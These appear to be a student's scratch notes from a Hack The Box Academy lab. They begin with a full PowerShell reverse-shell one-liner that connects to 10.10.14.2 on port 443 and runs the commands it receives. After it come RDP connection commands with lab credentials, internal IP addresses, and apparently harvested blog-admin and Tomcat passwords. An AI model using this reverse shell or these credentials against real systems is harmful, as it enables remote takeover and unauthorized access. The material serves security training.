powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.2',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


xfreerdp /f /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.68.45 /dynamic-resolution +clipboard /workarea
      - /drive:linux,/home/plaintext/htb/academy/filetransfer = mount
      - /workarea





 xfreerdp /u:'htb-student' /p:'HTB_@cademy_stdnt!' /v:10.129.68.45 +clipboard


Internal:
htb-student:HTB_@cademy_stdnt!: 
172.16.1.5
172.17.0.1

to manage the blog:
- admin / admin123!@#  ( keep it simple for the new admins )

to manage Tomcat on apache
- tomcat / Tomcatadm


Change the passwords soon..

